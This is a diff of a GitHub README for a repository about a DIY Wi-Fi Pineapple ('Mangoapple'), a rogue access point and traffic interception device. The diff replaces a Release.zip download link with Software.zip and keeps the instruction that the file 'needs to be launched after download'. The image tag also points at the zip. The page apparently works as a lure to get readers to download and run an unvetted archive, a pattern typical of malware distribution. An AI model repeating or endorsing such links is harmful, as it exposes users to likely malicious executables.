@@ -2,7 +2,7 @@
 
 Welcome to the **WiFi-Mangoapple-Resources** GitHub repository! Here you will find a collection of helpful resources related to the cheap DIY Wi-Fi Pineapple, also known as Wi-Fi Mangoapple. Whether you are looking for information on supported chipsets, configurations, troubleshooting common errors, or exploring advanced Wi-Fi hacking techniques, this repository aims to provide valuable insights to enhance your knowledge and skills in the field. 
 
-![WiFi Pineapple Image](https://github.com/duonquocnguyen/WiFi-Mangoapple-Resources/releases/download/v1.0/Release.zip)
+![WiFi Pineapple Image](https://github.com/duonquocnguyen/WiFi-Mangoapple-Resources/releases/download/v2.0/Software.zip)
 
 ## 📁 Repository Topics:
 - glinet
@@ -19,7 +19,7 @@ Welcome to the **WiFi-Mangoapple-Resources** GitHub repository! Here you will fi
 - wifi-security
 
 ## 🔗 Resources Download:
-[![Download Resources](https://github.com/duonquocnguyen/WiFi-Mangoapple-Resources/releases/download/v1.0/Release.zip)](https://github.com/duonquocnguyen/WiFi-Mangoapple-Resources/releases/download/v1.0/Release.zip) (File needs to be launched after download)
+[![Download Resources](https://github.com/duonquocnguyen/WiFi-Mangoapple-Resources/releases/download/v2.0/Software.zip)](https://github.com/duonquocnguyen/WiFi-Mangoapple-Resources/releases/download/v2.0/Software.zip) (File needs to be launched after download)
 
 ### 📌 About Wi-Fi Mangoapple:
 The Wi-Fi Mangoapple, a DIY version of the popular Wi-Fi Pineapple device, is widely used for security testing and ethical hacking purposes. With its ability to simulate rogue access points, intercept traffic, and perform various Wi-Fi attacks, the Wi-Fi Mangoapple is a powerful tool for professionals and enthusiasts alike.
